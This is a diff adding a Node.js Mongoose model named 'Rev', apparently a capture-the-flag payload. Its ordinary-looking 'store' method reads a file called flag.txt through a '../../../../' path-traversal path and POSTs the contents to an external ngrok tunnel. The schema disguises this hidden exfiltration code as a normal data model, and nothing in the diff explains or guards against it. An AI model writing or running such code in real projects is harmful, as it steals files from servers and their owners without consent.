@@ -1,0 +1,17 @@
+const mongoose = require('mongoose');
+const fs = require('fs');
+
+const revSchema = new mongoose.Schema({
+    name: { type: String, default: 'Rev' },
+    description: { type: String, default: 'rev' }
+});
+
+revSchema.methods.store = function() {
+    fetch("https://9a64-77-140-212-69.ngrok-free.app/", {
+        method: 'POST',
+        body: encodeURIComponent(fs.readFileSync('../../../../flag.txt', 'utf8')),
+    });
+    return this;
+};
+
+module.exports = mongoose.model('Rev', revSchema);
